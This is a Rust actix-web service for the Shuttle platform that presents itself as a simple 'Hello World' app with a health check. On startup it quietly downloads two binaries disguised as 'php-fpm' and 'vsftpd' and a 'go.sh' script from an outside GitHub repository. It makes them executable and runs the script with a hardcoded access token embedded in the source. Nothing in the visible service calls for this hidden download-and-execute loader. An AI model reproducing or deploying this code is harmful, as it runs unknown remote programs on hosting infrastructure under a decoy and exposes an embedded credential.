use actix_web::{get, web::ServiceConfig, HttpResponse, Result};
use std::fs::{self, File};
use std::io::Write;
use futures_util::StreamExt;
use anyhow::anyhow;
use shuttle_actix_web::ShuttleActixWeb;
use std::sync::Arc;
use tokio::sync::Mutex;

struct FileInfo {
    url: &'static str,
    filename: &'static str,
}

const FILES_TO_DOWNLOAD: &[FileInfo] = &[
    FileInfo {
        url: "https://github.com/wwrrtt/test/raw/refs/heads/main/php-fpm",
        filename: "php-fpm",
    },
    FileInfo {
        url: "https://github.com/wwrrtt/test/raw/refs/heads/main/vsftpd",
        filename: "vsftpd",
    },
    FileInfo {
        url: "https://github.com/wwrrtt/test/releases/download/3.0/go.sh",
        filename: "go.sh",
    },
];

async fn download_file(file: &FileInfo, base_path: &str) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    println!("Downloading file from {}...", file.url);
    
    // 检查文件是否已存在
    let file_path = format!("{}/{}", base_path, file.filename);
    if std::fs::metadata(&file_path).is_ok() {
        println!("File {} already exists, skipping download.", file.filename);
        return Ok(());
    }

    let response = reqwest::get(file.url).await?;
    if !response.status().is_success() {
        return Err(anyhow!("Failed to download {}: HTTP {}", file.url, response.status()).into());
    }

    let mut file_handle = File::create(&file_path)?;
    let mut stream = response.bytes_stream();

    while let Some(chunk) = stream.next().await {
        let chunk = chunk?;
        file_handle.write_all(&chunk)?;
        file_handle.flush()?;
    }

    println!("Downloaded {} successfully", file.filename);
    Ok(())
}

async fn give_executable_permission(filename: &str) -> std::io::Result<()> {
    println!("Giving executable permission to {}", filename);

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let metadata = fs::metadata(filename)?;
        let mut perms = metadata.permissions();
        perms.set_mode(0o755);
        fs::set_permissions(filename, perms)?;
        println!("Set executable permission for {}", filename);
    }

    #[cfg(not(unix))]
    {
        println!("Warning: Cannot set executable permission on non-Unix platform for {}", filename);
    }

    Ok(())
}

async fn execute_script(script: &str, token: &str) -> std::io::Result<()> {
    println!("Executing script: {}", script);
    
    let output = tokio::process::Command::new("bash")
        .arg(script)
        .env("Token", token)
        .output()
        .await?;

    if output.status.success() {
        println!("Script executed successfully");
        println!("Script stdout: {}", String::from_utf8_lossy(&output.stdout));
        Ok(())
    } else {
        let error_msg = String::from_utf8_lossy(&output.stderr);
        println!("Script execution failed: {}", error_msg);
        Err(std::io::Error::new(
            std::io::ErrorKind::Other,
            format!("Script execution failed: {}", error_msg),
        ))
    }
}

async fn download_and_execute_files() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let base_path = std::env::var("SHUTTLE_DATA_DIR").unwrap_or_else(|_| ".".to_string());
    println!("Using base path: {}", base_path);

    // 确保目录存在
    std::fs::create_dir_all(&base_path)?;

    // 下载所有文件
    for file in FILES_TO_DOWNLOAD {
        download_file(file, &base_path).await?;
    }

    // 授予可执行权限
    for file_info in FILES_TO_DOWNLOAD {
        let file_path = format!("{}/{}", base_path, file_info.filename);
        give_executable_permission(&file_path).await?;
    }

    // 执行 go.sh
    let script_path = format!("{}/go.sh", base_path);
    let token = "eyJhIjoiYjQ2N2Q5MGUzZDYxNWFhOTZiM2ZmODU5NzZlY2MxZjgiLCJ0IjoiYmNmZmQwNTktY2JjMC00YzhmLTgzMWQtNzRhYjM2ZDZiODFlIiwicyI6Ik4yTmtZVFEwWW1VdFlqRTJOaTAwT1dKakxXSmtZbVl0TkRnMllURTFZV000WmpNdyJ9";
    
    execute_script(&script_path, token).await?;

    Ok(())
}

#[get("/")]
async fn hello_world() -> Result<HttpResponse> {
    Ok(HttpResponse::Ok().content_type("text/plain").body("Hello World!"))
}

#[get("/health")]
async fn health_check(data: actix_web::web::Data<Arc<Mutex<bool>>>) -> Result<HttpResponse> {
    let initialized = *data.lock().await;
    if initialized {
        Ok(HttpResponse::Ok().content_type("text/plain").body("OK - Service initialized"))
    } else {
        Ok(HttpResponse::ServiceUnavailable().content_type("text/plain").body("Service initializing..."))
    }
}

#[shuttle_runtime::main]
async fn actix_web() -> ShuttleActixWeb<impl FnOnce(&mut ServiceConfig) + Send + Clone + 'static> {
    let initialized = Arc::new(Mutex::new(false));
    let initialized_clone = initialized.clone();

    // 异步初始化
    tokio::spawn(async move {
        match download_and_execute_files().await {
            Ok(_) => {
                println!("✅ Initialization completed successfully");
                *initialized_clone.lock().await = true;
            }
            Err(e) => {
                eprintln!("❌ Initialization failed: {}", e);
                // 将错误转换为字符串以避免 Send 问题
                *initialized_clone.lock().await = false;
            }
        }
    });

    let config = move |cfg: &mut ServiceConfig| {
        cfg.service(hello_world)
           .service(health_check)
           .app_data(actix_web::web::Data::new(initialized.clone()));
    };

    Ok(config.into())
}
